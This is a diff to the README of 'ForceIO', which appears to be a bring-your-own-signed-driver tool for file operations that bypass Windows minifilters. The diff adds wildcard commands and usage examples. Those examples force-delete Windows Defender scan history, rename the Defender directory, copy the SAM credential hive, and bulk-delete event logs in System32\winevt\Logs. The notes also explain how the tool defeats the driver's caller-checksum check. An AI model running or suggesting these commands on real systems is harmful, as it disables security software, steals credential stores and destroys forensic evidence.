@@ -33,12 +33,14 @@ ForceIO — minifilter-bypass file operations via signed driver
 Usage: ForceIO <command> <path> [dest]
 
 Commands:
-  delete <path>       Force-delete file or directory (bypasses WdFilter)
-  rename <src> <dst>  Force-rename/move file or directory
-  copy   <src> <dst>  Copy locked file
-  start               Load driver only
-  stop                Unload driver
-  cleanup             Stop driver, remove service, delete temp files
+  list    <path>       List visible directory entries (diagnostic)
+  locks   <path>       Show which processes lock the file (supports * and ?)
+  delete  <path>       Force-delete file or directory (supports * and ?, bypasses WdFilter)
+  rename  <src> <dst>  Force-rename/move file or directory
+  copy    <src> <dst>  Copy locked file (or snapshot mounted registry hive)
+  start                Load driver only
+  stop                 Unload driver
+  cleanup              Stop driver, remove service, delete temp files
 ```
 
 ### Examples
@@ -50,8 +52,25 @@ ForceIO.exe delete "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Serv
 :: Move a protected directory
 ForceIO.exe rename "C:\ProgramData\Microsoft\Windows Defender" "C:\ProgramData\Microsoft\Windows Defender_"
 
-:: Copy a locked file
+:: Copy a locked file (or mounted registry hive)
 ForceIO.exe copy "C:\Windows\System32\config\SAM" "C:\Temp\SAM.copy"
+
+:: Show which processes lock a file
+ForceIO.exe locks "C:\Windows\System32\winevt\Logs\HardwareEvents.evtx"
+
+:: Batch delete locked/protected files using wildcards (* and ?) in a single driver session
+ForceIO.exe delete "C:\Windows\System32\winevt\Logs\*.evtx"
+ForceIO.exe delete "C:\Windows\System32\winevt\Logs\Hardware?????.evtx"
+
+:: Query locks across files matching wildcards (* and ?)
+ForceIO.exe locks "C:\Windows\System32\winevt\Logs\*.evtx"
+ForceIO.exe locks "C:\Windows\System32\winevt\Logs\Hardware?????.evtx"
+
+:: Relative paths work from any working directory (e.g. when ForceIO is in System32 / PATH)
+cd C:\Windows\System32\winevt\Logs
+ForceIO.exe delete *.evtx
+ForceIO.exe delete Hardware?????.evtx
+ForceIO.exe locks *.evtx
 ```
 
 ---
@@ -62,9 +81,15 @@ ForceIO.exe copy "C:\Windows\System32\config\SAM" "C:\Temp\SAM.copy"
 
 2. **Atomic driver session** — `CreateServiceW` → `StartServiceW` → `DeviceIoControl` → `ControlService(STOP)` → `DeleteService` → `DeleteFileW`. The service exists in the registry only for the duration of the IOCTL. Zero `Sleep` calls.
 
-3. **Direct IOCTL** — constructs a 0x428-byte `METHOD_BUFFERED` buffer with source path, destination path, operation type, and flags, then calls `DeviceIoControl(0x222124)`.
+3. **Direct IOCTL** — constructs a 0x428-byte `METHOD_BUFFERED` buffer with source path, destination path, operation type, and flags, then calls `DeviceIoControl(0x222124)` for file operations or `0x222128` for lock queries.
 
 4. **Checksum bypass** — the driver validates callers by computing two checksums (XOR and alternating add/sub) over the calling process's EXE on disk. The build script appends correction bytes to satisfy both constraints without modifying the driver. The WHCP Authenticode signature remains intact.
+
+5. **WOW64 redirection bypass** — disables WOW64 file system redirection on 64-bit systems at startup (`Wow64DisableWow64FsRedirection`), enabling native access to `System32` directories (such as `System32\winevt\Logs\`) without redirection to `SysWOW64`.
+
+6. **CWD path canonicalization** — automatically expands relative paths (`GetFullPathNameW`) so commands work from any working directory, passing fully qualified `\??\C:\...` paths to the kernel driver.
+
+7. **Batch wildcard operations** — when deleting or querying locks using wildcards (`*` and `?`), the driver is loaded once, all matching files are processed within that single atomic session, and the driver is unloaded cleanly at the end.
 
 ---
 
